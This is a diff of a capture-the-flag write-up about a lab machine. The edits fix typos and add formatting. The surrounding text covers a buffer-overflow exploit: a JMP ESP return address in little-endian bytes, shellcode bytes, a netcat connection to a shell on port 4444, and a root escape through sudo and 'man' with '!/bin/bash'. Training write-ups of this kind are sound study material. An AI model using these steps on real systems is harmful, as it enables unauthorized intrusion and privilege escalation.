@@ -169,7 +169,7 @@ it is easy just type `!mona jmp -r esp ` at the bottom of the debugger
 
 address : 31 17 12 F3
 
-we need to conver it to little endian notion as the stack is filled form right to left it will be  : `\xf3\x12\x17\x31`
+we need to convert it to little endian notation as the stack is filled form right to left it will be  : `\xf3\x12\x17\x31`
 
 
 ##### 4- setup your shell code
@@ -254,6 +254,7 @@ except :
 ### after running script set the netcat
 
 
+##### 5- exploit !
 `$nc 192.168.1.8 4444 -v`
 
 ![image](https://user-images.githubusercontent.com/67979878/129600198-5b78f0bb-409f-4e97-ae21-dbb98ffe440a.png)
@@ -289,6 +290,7 @@ buf += b"\x6e\xcd\x6a\xc0\xf9\xf2\x3c\x4f\x73\x15\x0c\x64\x4e"
 buf += b"\x56"
 ```
 run it then set your netcat
+
 ![image](https://user-images.githubusercontent.com/67979878/129601564-8ddd3794-7cb6-4d96-bbf6-71220f62efeb.png)
 
 
@@ -305,7 +307,9 @@ so we can run man as root , at https://gtfobins.github.io/gtfobins/man/#sudo
 let's use it 
 
 `sudo /home/anansi/bin/anansi_util manual man` 
+
 !/bin/bash
+
 ![image](https://user-images.githubusercontent.com/67979878/129602094-30b896e3-5d61-4809-b6f1-6bc544de10c0.png)
 
 
